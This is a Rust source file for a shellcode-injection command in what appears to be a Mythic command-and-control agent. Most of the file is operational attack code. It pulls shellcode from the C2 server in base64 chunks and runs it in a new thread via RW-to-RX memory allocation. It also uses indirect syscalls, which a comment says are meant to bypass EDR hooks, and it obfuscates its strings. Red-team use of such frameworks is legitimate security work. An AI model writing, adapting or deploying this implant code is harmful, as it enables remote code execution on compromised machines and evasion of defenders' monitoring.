use crate::{AgentTask, ContinuedData, mythic_success};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::mem;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::DWORD;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

// WAIT_TIMEOUT constant
#[cfg(target_os = "windows")]
const WAIT_TIMEOUT: DWORD = 0x102;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// ShinjectArgs
#[derive(Serialize, Deserialize, Debug)]
pub struct ShinjectArgs {
    #[serde(rename = "shellcode-file-id")]
    pub shellcode_file_id: Option<String>,
    #[serde(rename = "shellcode-base64")]
    pub shellcode_base64: Option<String>,
    #[serde(rename = "process-id")]
    pub process_id: Option<u32>,
}

/// Inject shellcode - background task version that receives file through channels
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn inject_shellcode(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;

    // Get shellcode bytes
    let shellcode_bytes = if let Some(b64) = &args.shellcode_base64 {
        // Direct base64 shellcode
        general_purpose::STANDARD.decode(b64)
            .map_err(|e| format!("{}: {}", crate::obfstr::d(crate::obfstr::S_FAIL_DECODE), e))?
    } else if let Some(file_id) = &args.shellcode_file_id {
        // Download shellcode from Mythic - send request for first chunk
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": 1,
            }),
            "task_id": task.id,
            "user_output": format!("{} 1\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD)),
        }))?;

        // Receive first chunk
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
        let total_chunks = continued_args.total_chunks.unwrap();
        
        // Get remaining chunks if any
        for chunk_num in 2..=total_chunks {
            tx.send(json!({
                "upload": json!({
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                }),
                "task_id": task.id,
                "user_output": format!("{} {}/{}\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD), chunk_num, total_chunks),
            }))?;

            let task: AgentTask = serde_json::from_value(rx.recv()?)?;
            let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
            file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
        }
        file_data
    } else {
        return Err(crate::obfstr::d(crate::obfstr::S_NO_SHELLCODE).into());
    };

    if shellcode_bytes.is_empty() {
        return Err(crate::obfstr::d(crate::obfstr::S_SHELLCODE_EMPTY).into());
    }

    // Execute shellcode in current process in a spawned thread
    let shellcode_size = shellcode_bytes.len();
    let shellcode_bytes_clone = shellcode_bytes.clone();
    
    std::thread::spawn(move || {
        unsafe {
            if let Err(e) = execute_shellcode_in_thread(&shellcode_bytes_clone) {
                eprintln!("{}: {}", crate::obfstr::d(crate::obfstr::S_SHELLCODE_BG_FAIL), e);
            }
        }
    });
    
    // Return immediately without waiting for shellcode to finish
    tx.send(mythic_success!(
        task.id,
        format!("{} ({} bytes). {}.", crate::obfstr::d(crate::obfstr::S_SHELLCODE_RUNNING), shellcode_size, crate::obfstr::d(crate::obfstr::S_SHELLCODE_THREAD))
    ))?;
    
    Ok(())
}


/// Placeholder - not reached with new implementation
#[cfg(not(target_os = "windows"))]
pub fn inject_shellcode(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    Err(format!("shinject {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY)).into())
}

/// Execute shellcode in a thread (in-process execution)
#[cfg(target_os = "windows")]
unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
    use std::ptr;

    let buffer_size = shellcode.len();

    // Non-critical APIs stay on winapi_resolve
    type WaitFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
    type CloseFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
    type ExitCodeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u32) -> i32;

    let wait: WaitFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?
    );
    let close: CloseFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?
    );
    let exit_code: ExitCodeFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "GetExitCodeThread").ok_or("GetExitCodeThread")?
    );

    // Critical operations via indirect syscalls (bypass EDR hooks)
    let mem = crate::syscalls::nt_alloc(buffer_size, 0x04) // PAGE_READWRITE
        .map_err(|e| format!("Alloc: {}", e))?;

    ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, buffer_size);

    crate::syscalls::nt_protect(mem, buffer_size, 0x20) // PAGE_EXECUTE_READ
        .map_err(|e| { let _ = crate::syscalls::nt_free(mem); format!("Protect: {}", e) })?;

    let thread = crate::syscalls::nt_create_thread(-1isize as *mut std::ffi::c_void, mem)
        .map_err(|e| { let _ = crate::syscalls::nt_free(mem); format!("Thread: {}", e) })?;

    let wait_result = wait(thread, 1000);
    let mut code: u32 = 0;
    exit_code(thread, &mut code);
    close(thread);

    if wait_result == 258 { // WAIT_TIMEOUT
        Ok(format!("{} ({} bytes)", crate::obfstr::d(crate::obfstr::S_SHELLCODE_START), buffer_size))
    } else {
        Ok(format!("{} ({} bytes, exit: {})", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DONE), buffer_size, code))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let json_args = r#"{"shellcode-file-id": "test_file_id"}"#;
        let args: ShinjectArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.shellcode_file_id, Some("test_file_id".to_string()));
    }

    #[test]
    fn test_shinject_base64_decode() {
        let sample = vec![0x90, 0x90, 0x90, 0x90];
        let b64 = general_purpose::STANDARD.encode(&sample);
        let json_args = format!(r#"{{"shellcode-base64":"{}"}}"#, b64);
        let args: ShinjectArgs = serde_json::from_str(&json_args).unwrap();
        let decoded = general_purpose::STANDARD.decode(&args.shellcode_base64.unwrap()).unwrap();
        assert_eq!(decoded, sample);
    }
}
